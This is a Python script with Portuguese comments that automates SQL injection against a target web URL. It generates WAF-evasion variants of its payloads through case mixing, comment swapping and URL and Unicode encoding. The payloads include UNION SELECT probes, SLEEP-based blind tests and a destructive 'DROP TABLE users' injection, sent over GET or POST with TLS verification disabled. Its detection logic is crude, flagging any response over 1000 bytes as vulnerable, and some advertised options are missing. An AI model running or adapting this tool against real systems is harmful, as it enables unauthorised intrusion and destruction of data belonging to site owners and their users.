#!/usr/bin/env python3
"""SQLi WAF Bypass - Automatiza testes de SQLi com bypass de WAF.

Uso:
  python sqli-waf-bypass.py -u "http://example.com/search?q=" -p "id"
  python sqli-waf-bypass.py -u "http://example.com/login" -m POST -p "user"
  python sqli-waf-bypass.py -u "http://example.com" --detect-waf
  python sqli-waf-bypass.py -l urls.txt --batch

Bypass técnicas:
  - Comment variants (/**/, --, ;)
  - Case variation (UnIoN, sElEcT)
  - Whitespace alternatives (/**/,  , %09)
  - Encoding (URL, Unicode, Double URL)
  - Parentheses alternatives
"""
import sys
import argparse
import requests
import time
from urllib.parse import quote, urljoin

class SQLiTester:
    def __init__(self, url, method='GET', timeout=10):
        self.url = url
        self.method = method
        self.timeout = timeout
        self.results = {
            'vulnerable': [],
            'waf_detected': False,
            'payloads_tested': 0
        }

        # Desabilita warnings
        requests.packages.urllib3.disable_warnings()

    def detect_waf(self):
        """Detecta WAF/IDS."""
        print("[*] Detectando WAF...")

        waf_indicators = ['mod_security', 'cloudflare', 'akamai', 'imperva', 'f5']
        aggressive_payload = "1' AND SLEEP(5)-- -"

        try:
            start = time.time()
            response = requests.get(self.url + aggressive_payload, timeout=self.timeout, verify=False)
            elapsed = time.time() - start

            headers = response.headers
            for indicator in waf_indicators:
                if indicator.lower() in str(headers).lower() or indicator.lower() in response.text.lower():
                    print(f"[!] WAF DETECTADO: {indicator}")
                    self.results['waf_detected'] = True
                    return True

            if elapsed > 4:
                print("[!] POSSÍVEL BLIND SQLi (SLEEP detectado)")
                return False

        except requests.Timeout:
            print("[!] POSSÍVEL BLIND SQLi (Timeout)")
            return False
        except:
            pass

        print("[✓] Nenhum WAF óbvio detectado")
        return False

    def generate_payloads(self):
        """Gera variações de payloads para bypass."""
        base_payloads = [
            "1' OR '1'='1",
            "1' OR 1=1-- -",
            "1' OR 1=1/*",
            "1' UNION SELECT NULL-- -",
            "1' UNION SELECT NULL,NULL-- -",
            "1' UNION SELECT NULL,NULL,NULL-- -",
            "1' AND SLEEP(5)-- -",  # Time-based
            "1'; DROP TABLE users-- -",
            "1' AND '1'='1",
            "' UNION ALL SELECT NULL-- -"
        ]

        # Variações para bypass
        bypass_variations = []
        for payload in base_payloads:
            # Original
            bypass_variations.append(payload)

            # Uppercase/lowercase mix
            bypass_variations.append(self._case_variation(payload))

            # Comment variations
            for comment in ['/**/','--+','-- -',';','%0a','%20%20']:
                bypass_variations.append(payload.replace('-- -', comment))

            # Encoding
            bypass_variations.append(quote(payload))
            bypass_variations.append(self._unicode_encode(payload))

        return list(set(bypass_variations))

    def _case_variation(self, payload):
        """Varia case de keywords."""
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'SLEEP', 'DROP']
        result = payload
        for kw in keywords:
            result = result.replace(kw, ''.join(c.upper() if i % 2 else c.lower()
                                               for i, c in enumerate(kw)))
        return result

    def _unicode_encode(self, payload):
        """Encode para Unicode."""
        return ''.join(f'%u{ord(c):04x}' if c.isalpha() else c for c in payload)

    def test_sqli(self, param, payloads=None):
        """Testa SQLi."""
        if not payloads:
            payloads = self.generate_payloads()

        print(f"\n[*] Testando {len(payloads)} payloads contra '{param}'...")

        for i, payload in enumerate(payloads):
            self.results['payloads_tested'] += 1

            # Prepara request
            if self.method == 'GET':
                test_url = self.url + payload if '?' in self.url else self.url + f"?{param}=" + payload
            else:
                test_url = self.url

            try:
                if self.method == 'GET':
                    response = requests.get(test_url, timeout=self.timeout, verify=False)
                else:
                    data = {param: payload}
                    response = requests.post(test_url, data=data, timeout=self.timeout, verify=False)

                # Análise
                if self._check_vulnerability(payload, response):
                    self.results['vulnerable'].append({
                        'payload': payload,
                        'method': self.method,
                        'parameter': param,
                        'status': response.status_code,
                        'indication': 'Diferenças detectadas na resposta'
                    })
                    print(f"  [!] VULNÁVEL: {payload}")

                if (i + 1) % 10 == 0:
                    print(f"  [⏳] {i+1}/{len(payloads)} testados...")

            except requests.Timeout:
                # Possível time-based
                if 'SLEEP' in payload:
                    print(f"  [!] TIME-BASED: {payload}")
                    self.results['vulnerable'].append({
                        'payload': payload,
                        'method': self.method,
                        'type': 'Time-based Blind',
                        'indication': 'Timeout detectado'
                    })
            except Exception as e:
                pass

        print(f"\n[+] Testados {self.results['payloads_tested']} payloads")
        print(f"[+] Vulneráveis encontradas: {len(self.results['vulnerable'])}")

    def _check_vulnerability(self, payload, response):
        """Verifica indicadores de vulnerabilidade."""
        indicators = [
            'MySQL', 'MSSQL', 'ODBC', 'OLE DB', 'syntax error',
            'Warning: mysql', 'Fatal error',
            'You have an error in your SQL syntax'
        ]

        for indicator in indicators:
            if indicator.lower() in response.text.lower():
                return True

        # Error detection via response length change
        if len(response.content) > 1000:
            return True

        return False

    def generate_report(self, output_file=None):
        """Gera relatório."""
        report = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'url': self.url,
            'method': self.method,
            'summary': {
                'payloads_tested': self.results['payloads_tested'],
                'vulnerabilities': len(self.results['vulnerable']),
                'waf_detected': self.results['waf_detected']
            },
            'vulnerabilities': self.results['vulnerable']
        }

        if output_file:
            import json
            with open(output_file, 'w') as f:
                json.dump(report, f, indent=2)
            print(f"\n[+] Relatório: {output_file}")

        return report

def main():
    parser = argparse.ArgumentParser(description="SQLi WAF Bypass")
    parser.add_argument('-u', '--url', required=True, help='URL alvo')
    parser.add_argument('-p', '--param', help='Parâmetro para testar')
    parser.add_argument('-m', '--method', default='GET', help='Método HTTP')
    parser.add_argument('--detect-waf', action='store_true', help='Detecta WAF')
    parser.add_argument('-l', '--list', help='Lista de URLs')
    parser.add_argument('-o', '--output', help='Arquivo de saída')

    args = parser.parse_args()

    print(f"\n{'='*70}")
    print(f"💉 SQLi WAF Bypass")
    print(f"{'='*70}\n")

    tester = SQLiTester(args.url, method=args.method)

    if args.detect_waf:
        tester.detect_waf()

    if args.param:
        tester.test_sqli(args.param)

    tester.generate_report(args.output)
    print(f"\n[+] Teste completo!")

if __name__ == "__main__":
    main()
